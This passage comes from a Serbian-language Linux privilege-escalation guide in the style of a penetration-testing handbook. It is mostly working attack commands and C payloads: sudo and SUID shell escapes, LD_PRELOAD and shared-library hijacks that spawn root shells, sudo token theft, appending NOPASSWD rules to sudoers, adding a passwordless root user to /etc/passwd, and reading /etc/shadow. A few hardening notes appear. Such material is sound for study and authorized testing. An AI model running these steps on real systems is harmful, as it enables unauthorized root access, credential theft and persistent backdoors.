(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otvoreni portovi

Uvek proverite mrežne servise koji rade na mašini sa kojom niste mogli da komunicirate pre nego što ste joj pristupili:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Proverite da li možete sniff traffic. Ako možete, mogli biste da dohvatite neke credentials.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Proverite **who** ste, koje **privileges** imate, koji **users** postoje u sistemima, koji mogu da se **login** i koji imaju **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Neke verzije Linuxa su bile pogođene bagom koji omogućava korisnicima sa **UID > INT_MAX** da eskaliraju privilegije. Više informacija: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Iskoristi ga** pomoću: **`systemd-run -t /bin/bash`**

### Grupe

Proveri da li si **član neke grupe** koja bi ti mogla dodeliti root privilegije:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Proveri da li se u clipboard-u nalazi nešto interesantno (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **znate bilo koju lozinku** u okruženju, **pokušajte da se prijavite kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta da pravite mnogo buke i na računaru su prisutni `su` i `timeout` binarni fajlovi, možete pokušati da brute-force-ujete korisnika koristeći [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa `-a` parametrom takođe pokušava da brute-force-uje korisnike.

## Zloupotrebe upisivog PATH-a

### $PATH

Ako ustanovite da možete **pisati u neki direktorijum iz $PATH**, možda ćete moći da eskalirate privilegije tako što ćete **kreirati backdoor unutar upisivog direktorijuma** pod imenom neke komande koja će biti izvršena od strane drugog korisnika (idealno root) i koja se **ne učitava iz direktorijuma koji se nalazi pre** vašeg upisivog direktorijuma u $PATH.

### SUDO and SUID

Možda vam je dozvoljeno da izvršite neku komandu koristeći sudo, ili fajlovi mogu imati suid bit. Proverite to koristeći:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane komande vam omogućavaju da čitate i/ili pišete datoteke ili čak izvršite komandu.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može omogućiti korisniku da izvrši neku komandu sa privilegijama drugog korisnika bez poznavanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`, sada je trivijalno dobiti shell dodavanjem ssh key u root direktorijum ili pozivanjem `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **set an environment variable** prilikom izvršavanja nečega:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **zasnovan na HTB machine Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** koji је omogućavao učitavanje произвољне python библиотеке током извршавања скрипте као root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sačuvan preko sudo env_keep → root shell

Ako sudoers sačuva `BASH_ENV` (npr. `Defaults env_keep+="ENV BASH_ENV"`), možete iskoristiti Bash-ovo ponašanje pri pokretanju neinteraktivnih shell-ova da pokrenete proizvoljan kod kao root kada pozivate dozvoljenu komandu.

- Zašto to funkcioniše: Za neinteraktivne shell-ove, Bash evaluira `$BASH_ENV` i source-uje taj fajl pre nego što pokrene ciljni skript. Mnoge sudo politike dozvoljavaju pokretanje skripta ili shell wrapper-a. Ako `BASH_ENV` bude sačuvan od strane sudo, vaš fajl će biti učitan sa root privilegijama.

- Zahtevi:
- Pravilo u sudo koje možete pokrenuti (bilo koji target koji poziva `/bin/bash` neinteraktivno, ili bilo koji bash skript).
- `BASH_ENV` prisutan u `env_keep` (proverite sa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Ojačavanje:
- Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`, preferirajte `env_reset`.
- Izbegavajte shell wrappers za sudo-allowed komande; koristite minimalne binarne fajlove.
- Razmotrite sudo I/O logging i alerting kada se koriste sačuvane env vars.

### Sudo — putevi za zaobilaženje izvršenja

**Skočite** da pročitate druge fajlove ili koristite **symlinks**. Na primer u sudoers fajlu: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se **wildcard** koristi (\*), još je lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Protivmere**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez command path

Ako je **sudo permission** dodeljen jednoj komandi **bez specificiranja path-a**: _hacker10 ALL= (root) less_ možete to exploit-ovati menjajući PATH variable.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se takođe može koristiti ako **suid** binary **izvršava neku drugu komandu bez navođenja putanje do nje (uvek proverite sadržaj čudnog SUID binarnog fajla pomoću** _**strings**_**).**

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary sa putanjom komande

Ako **suid** binary **izvršava drugu komandu navodeći putanju**, onda možete pokušati da **export a function** imenovanu kao komanda koju suid fajl poziva.

Na primer, ako suid binary poziva _**/usr/sbin/service apache2 start**_ morate pokušati da kreirate funkciju i exportujete je:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binarni fajl, ova funkcija će biti izvršena

### LD_PRELOAD & **LD_LIBRARY_PATH**

Okruženjska promenljiva **LD_PRELOAD** koristi se za navođenje jedne ili više shared libraries (.so files) koje loader učitava pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces se naziva učitavanje biblioteke unapred.

Međutim, da bi se održala sigurnost sistema i sprečilo zloupotrebljavanje ove funkcije, naročito kod **suid/sgid** izvršnih fajlova, sistem nameće određene uslove:

- Loader zanemaruje **LD_PRELOAD** za izvršne fajlove gde real user ID (_ruid_) nije isti kao effective user ID (_euid_).
- Za izvršne fajlove sa suid/sgid, samo biblioteke u standardnim putanjama koje takođe imaju suid/sgid biće učitane unapred.

Do eskalacije privilegija može doći ako imate mogućnost izvršavanja komandi sa `sudo` i izlaz `sudo -l` sadrži izjavu **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da okruženjska promenljiva **LD_PRELOAD** ostane i bude prepoznata čak i kada se komande pokreću sa `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvajte kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim **compile it** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na kraju, **escalate privileges** pokretanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc može biti zloupotrebljen ako napadač kontroliše **LD_LIBRARY_PATH** env variable, jer on kontroliše putanju na kojoj će se pretraživati biblioteke.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kada naiđete na binarni fajl sa **SUID** permisijama koji izgleda neuobičajeno, dobra je praksa proveriti da li pravilno učitava **.so** fajlove. To se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, nailazak na grešku kao _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeriše potencijal za eksploataciju.

Da bi se ovo iskoristilo, kreira se C fajl, na primer _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, nakon što se kompajlira i izvrši, ima za cilj eskalaciju privilegija manipulacijom dozvola fajlova i pokretanjem shell-a sa povišenim privilegijama.

Kompajlirajte gore navedeni C fajl u shared object (.so) fajl pomoću:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na kraju, pokretanje pogođenog SUID binary-ja trebalo bi da aktivira exploit i omogući potencijalno kompromitovanje sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binarni fajl koji učitava biblioteku iz fascikle u koju možemo pisati, napravimo biblioteku u toj fascikli sa potrebnim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku poput
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali mora da ima funkciju nazvanu `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih fajlova koje napadač može iskoristiti da zaobiđe lokalna bezbednosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve kada možete **samo ubacivati argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih fajlova koje se mogu zloupotrebiti za izlazak iz restricted shells, eskalaciju ili održavanje povišenih privilegija, transfer fajlova, spawn bind i reverse shells, i olakšavanje ostalih post-exploitation zadataka.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako imate pristup `sudo -l`, možete koristiti alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li pronalazi način da iskoristi bilo koje sudo pravilo.

### Reusing Sudo Tokens

U slučajevima kada imate **sudo access** ali nemate lozinku, možete eskalirati privilegije tako što ćete **sačekati izvršenje sudo komande i potom preuzeti token sesije**.

Zahtevi za eskalaciju privilegija:

- Već imate shell kao korisnik _sampleuser_
- _sampleuser_ je **koristio `sudo`** za izvršavanje nečega u **poslednjih 15 minuta** (po defaultu to je trajanje sudo tokena koje nam omogućava da koristimo `sudo` bez unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` mora da bude 0
- `gdb` je dostupan (možete ga otpremiti)

(Privremeno možete omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno izmenom `/etc/sysctl.d/10-ptrace.conf` i postavljanjem `kernel.yama.ptrace_scope = 0`)

Ako su svi ovi zahtevi ispunjeni, **možete eskalirati privilegije koristeći:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Prvi **exploit** (`exploit.sh`) će kreirati binarni fajl `activate_sudo_token` u _/tmp_. Možete ga koristiti da **aktivirate sudo token u vašoj sesiji** (nećete automatski dobiti root shell, uradite `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Drugi **exploit** (`exploit_v2.sh`) će napraviti sh shell u _/tmp_ **koji pripada root-u i ima setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **treći exploit** (`exploit_v3.sh`) će **kreirati sudoers file** koji čini **sudo tokens večnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **write permissions** u toj fascikli ili na bilo kojoj od kreiranih datoteka unutar fascikle, možete koristiti binarni fajl [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **kreirate sudo token za korisnika i PID**.\
Na primer, ako možete da prepišete fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID 1234, možete **dobiti sudo privilegije** bez potrebe da znate lozinku izvršivši:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Fajl `/etc/sudoers` i fajlovi unutar `/etc/sudoers.d` konfigurišu ko može da koristi `sudo` i na koji način. Ovi fajlovi **podrazumevano mogu biti čitani samo od strane korisnika root i grupe root**.\
**Ako** možete **čitati** ovaj fajl, mogli biste **dobiti neke zanimljive informacije**, a ako možete **pisati** bilo koji fajl, moći ćete da **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možeš da pišeš, možeš i da zloupotrebiš ovu dozvolu.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način da se zloupotrebe ova dopuštenja:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje alternative `sudo` binarnoj datoteci, kao što je `doas` na OpenBSD — ne zaboravite da proverite njegovu konfiguraciju u `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da se **korisnik obično povezuje na mašinu i koristi `sudo`** za eskalaciju privilegija i imate shell u tom korisničkom kontekstu, možete **napraviti novi sudo izvršni fajl** koji će pokrenuti vaš kod kao root, a zatim komandu korisnika. Zatim **izmenite $PATH** u korisničkom kontekstu (na primer dodavanjem novog puta u .bash_profile) tako da kada korisnik izvrši sudo, vaš sudo izvršni fajl bude izvršen.

Imajte na umu da ako korisnik koristi drugačiji shell (ne bash) moraćete da izmenite druge fajlove da dodate novi put. Na primer[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Možete naći još jedan primer u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanjem nečeg poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljena biblioteka

### ld.so

Fajl `/etc/ld.so.conf` pokazuje **odakle dolaze učitane konfiguracione datoteke**. Obično ovaj fajl sadrži sledeću liniju: `include /etc/ld.so.conf.d/*.conf`

To znači da će biti pročitane konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf`. Ove konfiguracione datoteke **pokazuju na druge foldere** gde će se tražiti **biblioteke**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima dozvole za pisanje** na bilo koji od navedenih puteva: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo koju datoteku unutar `/etc/ld.so.conf.d/` ili bilo koji folder naveden u konfig fajlu unutar `/etc/ld.so.conf.d/*.conf` može uspeti da eskalira privilegije.\  
Pogledajte **kako iskoristiti ovu pogrešnu konfiguraciju** na sledećoj stranici:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem lib u `/var/tmp/flag15/` biće korišćena od strane programa na ovom mestu, kako je navedeno u promenljivoj `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte zlonamernu biblioteku u `/var/tmp` pomoću `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **podskup dostupnih root privilegija procesu**. Ovo efikasno razlaže root **privilegije u manje i jasno odvojene jedinice**. Svaka od ovih jedinica može potom biti nezavisno dodeljena procesima. Na taj način se smanjuje ukupan skup privilegija, što umanjuje rizik od eksploatacije.\
Pročitajte sledeću stranicu da biste **saznali više o capabilities i kako ih zloupotrebiti**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

U direktorijumu, **bit za "execute"** implicira da pogođeni korisnik može da izvrši "**cd**" u folder.\
Bit **"read"** znači da korisnik može da **lista** **fajlove**, a bit **"write"** znači da korisnik može da **obriše** i **kreira** nove **fajlove**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, sposoban da **nadjača tradicionalne ugo/rwx dozvole**. Ove dozvole poboljšavaju kontrolu pristupa fajlovima ili direktorijumima tako što omogućavaju ili uskraćuju prava određenim korisnicima koji nisu vlasnici ili deo grupe. Ovaj nivo **granularnosti omogućava preciznije upravljanje pristupom**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodeli** korisniku "kali" prava čitanja i pisanja nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Dohvatite** fajlove sa specifičnim ACLs iz sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otvorene shell sesije

U **starijim verzijama** možete **hijack** neku **shell** sesiju drugog korisnika (**root**).\
U **najnovijim verzijama** bićete u mogućnosti da se **povežete** samo na **screen sesije** svog **korisnika**. Međutim, možete pronaći **zanimljive informacije unutar sesije**.

### screen sessions hijacking

**Prikaži screen sesije**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Priključi se na session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Ovo je bio problem sa **starim tmux verzijama**. Nisam mogao da hijackujem tmux (v2.1) sesiju koju je kreirao root kao neprivilegovan korisnik.

**Prikaži tmux sesije**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Poveži se na sesiju**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** za primer.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na sistemima zasnovanim na Debianu (Ubuntu, Kubuntu, etc) između September 2006. i May 13th, 2008 mogu biti pogođeni ovim bagom.\
Ovaj bug nastaje pri kreiranju novog ssh ključa na tim OS-ovima, jer je **bilo moguće samo 32,768 varijacija**. To znači da se sve mogućnosti mogu izračunati i da, **posedujući ssh javni ključ, možete potražiti odgovarajući privatni ključ**. Izračunate mogućnosti možete naći ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Određuje da li je autentifikacija lozinkom dozvoljena. Podrazumevano je `no`.
- **PubkeyAuthentication:** Određuje da li je autentifikacija javnim ključem dozvoljena. Podrazumevano je `yes`.
- **PermitEmptyPasswords**: Kada je autentifikacija lozinkom dozvoljena, određuje da li server dozvoljava prijavu na naloge sa praznim lozinkama. Podrazumevano je `no`.

### PermitRootLogin

Određuje da li se root može prijaviti koristeći ssh, podrazumevano je `no`. Moguće vrednosti:

- `yes`: root može da se prijavi koristeći lozinku i privatni ključ
- `without-password` or `prohibit-password`: root se može prijaviti samo pomoću privatnog ključa
- `forced-commands-only`: root se može prijaviti samo koristeći privatni ključ i samo ako su navedene opcije za komande
- `no`: ne

### AuthorizedKeysFile

Određuje fajlove koji sadrže javne ključeve koji se mogu koristiti za autentifikaciju korisnika. Može sadržati tokene poput `%h`, koji će biti zamenjen home direktorijumom. **Možete navesti apsolutne puteve** (koji počinju sa `/`) ili **relativne puteve iz korisničkog home**. Na primer:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija će ukazati da ako pokušate da se prijavite sa **privatnim** ključem korisnika "**testusername**", ssh će uporediti javni ključ vašeg ključa sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **koristite svoje lokalne SSH ključeve umesto da ostavljate ključeve** (bez passphrases!) na vašem serveru. Dakle, moći ćete da **skočite** putem ssh **na host** i odatle **pređete na drugi host** **koristeći** **ključ** koji se nalazi na vašem **početnom hostu**.

Potrebno je да podesite ovu opciju u `$HOME/.ssh.config` ovako:
```
Host example.com
ForwardAgent yes
```
Obratite pažnju da ako je `Host` postavljen na `*`, svaki put kada korisnik pređe na drugi računar, taj host će moći da pristupi ključevima (što predstavlja bezbednosni problem).

Fajl `/etc/ssh_config` može da **prepiše** ove **opcije** i dozvoli ili onemogući ovu konfiguraciju.\
Fajl `/etc/sshd_config` može da **dozvoli** ili **onemogući** ssh-agent forwarding pomoću ključne reči `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako ustanovite da je Forward Agent konfigurisan u okruženju, pročitajte sledeću stranicu jer **možda ćete moći da ga zloupotrebite za eskalaciju privilegija**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljivi fajlovi

### Datoteke profila

Fajl `/etc/profile` i fajlovi u okviru `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novi shell**. Dakle, ako možete da **pišete ili izmenite bilo koji od njih, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako se pronađe neka neobična skripta profila, trebalo bi je proveriti zbog **osetljivih detalja**.

### Passwd/Shadow datoteke

U zavisnosti od OS-a, `/etc/passwd` i `/etc/shadow` datoteke mogu imati drugačije ime ili može postojati backup. Stoga se preporučuje da **pronađete sve njih** i **proverite да ли можете да ih прочитате** kako biste videli **da li se u datotekama nalaze hash-ovi**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
U nekim slučajevima možete pronaći **password hashes** unutar fajla `/etc/passwd` (ili ekvivalentnog)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Prvo, generišite lozinku koristeći jednu od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Zatim dodajte korisnika `hacker` i postavite generisanu lozinku.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Na primer: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti komandu `su` sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije da dodate lažnog korisnika bez lozinke.\ UPOZORENJE: možete ugroziti trenutnu bezbednost mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi na `/etc/pwd.db` i `/etc/master.passwd`, takođe `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Treba da proverite da li možete da **pišete u neke osetljive fajlove**. Na primer, možete li da pišete u neki **konfiguracioni fajl servisa**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na primer, ako mašina pokreće **tomcat** server i možete **modify the Tomcat service configuration file inside /etc/systemd/,** onda možete izmeniti linije:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaš backdoor će se izvršiti sledeći put kada se tomcat pokrene.

### Proverite foldere

Sledeći folderi mogu sadržati backups ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Neobična lokacija/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjene datoteke u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB fajlovi
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
